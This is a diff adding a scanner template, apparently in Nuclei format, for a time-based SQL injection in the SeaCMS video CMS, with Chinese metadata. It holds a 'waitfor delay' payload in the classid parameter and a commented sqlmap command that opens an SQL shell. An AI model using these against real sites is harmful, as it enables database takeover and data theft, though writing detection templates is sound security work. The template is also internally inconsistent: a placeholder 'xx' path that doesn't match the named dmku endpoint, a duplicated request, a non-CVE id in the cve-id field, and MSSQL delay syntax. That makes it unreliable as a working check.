@@ -1,0 +1,46 @@
+id: TVE-2024-105221050
+
+info:
+  name: SeaCMS海洋影视管理系统dmku存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    SeaCMS是一套专为不同需求的站长而设计的视频点播系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选。
+    SeaCMS dmku存在SQL 注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等
+  reference:
+    - https://blog.csdn.net/weixin_43167326/article/details/139016633
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: TVE-2024-105221050
+    cvss-score: 7.8
+    cwe-id: CWE-89
+  metadata:
+    date: 
+    version: 
+    fofa-query: 
+  tags: sqli
+
+# python sqlmap.py -u "http://xxxx?id=1*" --sql-shell 
+
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET xx?pageId=login&classid=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        @timeout: 10s
+        GET xx?pageId=login&classid=1'waitfor+delay+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+ 
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=3'
+          - 'status_code == 200'
+        condition: and
+
